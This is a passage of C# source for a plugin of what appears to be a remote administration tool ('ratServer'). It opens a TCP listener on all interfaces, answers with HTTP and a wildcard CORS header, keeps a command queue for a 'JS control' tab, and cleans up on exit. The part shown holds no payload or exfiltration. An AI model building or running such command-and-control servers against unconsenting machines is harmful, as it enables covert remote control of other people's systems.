            string resp = "HTTP/1.1 200 OK\r\nServer: ratServer\r\nContent-Length: " + content.Length + "\r\nContent-Type: application/json\r\nAccess-Control-Allow-Origin: *\r\n\r\n";
            byte[] header = Encoding.ASCII.GetBytes(resp);
            byte[] total = new byte[header.Length + content.Length];
            Array.Copy(header, total, header.Length);
            Array.ConstrainedCopy(content, 0, total, header.Length, content.Length);
            //Send response to client
            client.Send(total);
        }

        /// <summary>
        /// Plugin Thread Entry Point
        /// </summary>
        public void PMain()
        {
            int port = -1; //Define the server port
            if (canDisplay) port = GetPort();
            if (port == -1)
            {
                Console.WriteLine("Invalid Port or Permissions Denied");
                return;
            }
            //Create and start the cleaning thread
            Thread t = new Thread(new ThreadStart(CleanThread));
            t.Start();
            //Create and start the server socket
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ep = new IPEndPoint(IPAddress.Any, port);
            _serverSocket.Bind(ep);
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptClient), null);
            //Create the UI of the plugin
            CreateUI();
            Console.WriteLine("Setup completed"); //Debug message
        }

        /// <summary>
        /// Plugin Exit Point
        /// </summary>
        public void OnExit()
        {
            //Remove all external APIs and permissions provided by this plugin
            sCore.Utils.ExternalAPIs.RemoveAllFunctions(apiToken);
            sCore.Utils.ExternalAPIs.RemovePermissionCheckers(apiToken);
            jsAllowedTokens.Clear();
            //Set flag to stop running threads
            threadStop = true;
            //Clear, dispose commandPoll
            commandPoll.Clear();
            //Disconnect, dispose, close the serverSocket
            if (_serverSocket.Connected) _serverSocket.Disconnect(false);
            _serverSocket.Close();
            _serverSocket.Dispose();
            _serverSocket = null;
            //Clear and dispose the client list
            _clientList.Clear();
            //Remove the tabPage
            sCore.UI.CommonControls.mainTabControl.Invoke(new Action(() =>
            {

                TabPage toRemove = null;

                foreach (TabPage tp in sCore.UI.CommonControls.mainTabControl.TabPages)
                {
                    if (tp.Text.ToLower() == "js control")
                    {
                        toRemove = tp;
                    }
                }

                if (toRemove != null) sCore.UI.CommonControls.mainTabControl.TabPages.Remove(toRemove);

            }));
        }
    }
}
